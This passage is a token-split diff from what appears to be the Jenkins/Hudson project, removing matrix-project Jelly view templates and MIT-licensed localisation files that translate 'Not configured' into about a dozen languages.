"TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "THE", "SOFTWARE", ".", ">", "<", "!", "Used", "to", "asynchronously", "update", "executor", "queue", ">", "<", "?", "jelly", "escape", "-", "by", "-", "default", "=", "'", "true", "'", "?>", "<", "j", ":", "jelly", "xmlns", ":", "j", "=", "\"", "jelly", ":", "core", "\"", "xmlns", ":", "st", "=", "\"", "jelly", ":", "stapler", "\"", "xmlns", ":", "d", "=", "\"", "jelly", ":", "define", "\"", "xmlns", ":", "l", "=", "\"/", "lib", "/", "layout", "\"", "xmlns", ":", "t", "=", "\"/", "lib", "/", "hudson", "\"", "xmlns", ":", "s", "=", "\"/", "lib", "/", "form", "\"", "xmlns", ":", "p", "=", "\"/", "lib", "/", "hudson", "/", "project", "\"", ">", "<", "l", ":", "ajax", ">", "<", "p", ":", "matrix", "autoRefresh", "=", "\"", "true", "\"", ">", "<", "j", ":", "choose", ">", "<", "j", ":", "when", "test", "=", "\"$", "{", "p", "=", "=", "null", "}", "\">", "<", "img", "src", "=", "\"$", "{", "imagesURL", "}", "/", "24x24", "/", "grey", ".", "png", "\"", "tooltip", "=", "\"$", "{%", "Not", "configured", "}", "\"", "alt", "=", "\"$", "{%", "Not", "configured", "}", "\"", "height", "=", "\"", "24", "\"", "width", "=", "\"", "24", "\"", "/>", "<", "/", "j", ":", "when", ">", "<", "j", ":", "otherwise", ">", "<", "a", "href", "=", "\"$", "{", "p", ".", "shortUrl", "}", "\"", "class", "=", "\"", "model", "-", "link", "inside", "\"", ">", "<", "img", "src", "=", "\"$", "{", "imagesURL", "}", "/", "24x24", "/", "${", "p", ".", "buildStatusUrl", "}", "\"", "tooltip", "=", "\"$", "{", "p", ".", "iconColor", ".", "description", "}", "\"", "alt", "=", "\"$", "{", "p", ".", "iconColor", ".", "description", "}", "\"", "height", "=", "\"", "24", "\"", "width", "=", "\"", "24", "\"", "/>", "<", "j", ":", "if", "test", "=", "\"$", "{", "empty", "(", "o", ".", "x", ")", "and", "empty", "(", "o", ".", "y", ")", "}\"", ">", "$", "{", "p", ".", "combination", ".", "toString", "(", "o", ".", "z", ")", "}", "<", "/", "j", ":", "if", ">", "<", "/", "a", ">", "<", "/", "j", ":", "otherwise", ">", "<", "/", "j", ":", "choose", ">", "<", "/", "p", ":", "matrix", ">", "<", "/", "l", ":", "ajax", ">", "<", "/", "j", ":", "jelly", ">", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "Kohsuke", "Kawaguchi", ".", "Knud", "Poulsen", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Not", "\\", "configured", "=", "Ikke", "konfigureret", "@", "@", "-", "1", "+", "0", ",", "0", "@", "@", "Not", "\\", "configured", "=", "Nicht", "konfiguriert", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Not", "\\", "configured", "=", "Sin", "configurar", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Not", "\\", "configured", "=", "Ei", "konfiguroitu", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Eric", "Lefevre", "-", "Ardant", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Not", "\\", "configured", "=", "Non", "configur", "\\", "u00E9e", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Not", "\\", "configured", "=", "Non", "configurato", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Seiji", "Sogabe", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Not", "\\", "configured", "=", "\\", "u672A", "\\", "u8A2D", "\\", "u5B9A", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Not", "\\", "configured", "=", "Nie", "skonfigurowane", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", ",", "Kohsuke", "Kawaguchi", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "and", "a", "number", "of", "other", "of", "contributers", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Not", "\\", "configured", "=", "N", "\\", "u00e3o", "configurado", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Cleiber", "Silva", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Not", "\\", "configured", "=", "N", "\\", "u00e3o", "configurado", "@", "@", "-", "1", ",", "3", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Not", "\\", "configured", "=", "Neconfigurat", "@", "@", "-", "1", ",", "3", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Not", "\\", "configured", "=", "\\", "u041D", "\\", "u0435", "\\", "u0441", "\\", "u043A", "\\", "u043E", "\\", "u043D", "\\", "u0444", "\\", "u0438", "\\", "u0433", "\\", "u0443", "\\", "u0440", "\\", "u0438", "\\", "u0440", "\\", "u043E", "\\", "u0432", "\\", "u0430", "\\", "u043D", "\\", "u043E", "@", "@", "-", "1", ",", "3", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Not", "\\", "configured", "=", "Ej", "konfigurerad", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Not", "\\", "configured", "=", "\\", "u5C1A", "\\", "u672A", "\\", "u914D", "\\", "u7F6E", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2013", ",", "Chunghwa", "Telecom", "Co", ".", ",", "Ltd", ".", ",", "Pei", "-", "Tang", "Huang", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Not", "\\", "configured", "=", "\\", "u672a", "\\", "u8a2d", "\\", "u5b9a", "@", "@", "-", "1", ",", "99", "+", "0", ",", "0", "@", "@", "<", "!", "The", "MIT", "License", "Copyright", "(", "c", ")", "2004", "-", "2011", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Stephen", "Connolly", ",", "Yahoo", "!", ",", "Inc", ".", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "THE", "SOFTWARE", ".", ">", "<", "!", "Config", "page", ".", ">", "<", "?", "jelly", "escape", "-", "by", "-", "default", "=", "'", "true", "'", "?>", "<", "j", ":", "jelly", "xmlns", ":", "j", "=", "\"", "jelly", ":", "core", "\"", "xmlns", ":", "st", "=", "\"", "jelly", ":", "stapler", "\"", "xmlns", ":", "d", "=", "\"", "jelly", ":", "define", "\"", "xmlns", ":", "l", "=", "\"/", "lib", "/", "layout", "\"", "xmlns", ":", "t", "=", "\"/", "lib", "/", "hudson", "\"", "xmlns", ":", "f", "=", "\"/", "lib", "/", "form", "\"", "xmlns", ":", "i", "=", "\"", "jelly", ":", "fmt", "\"", "xmlns", ":", "p", "=", 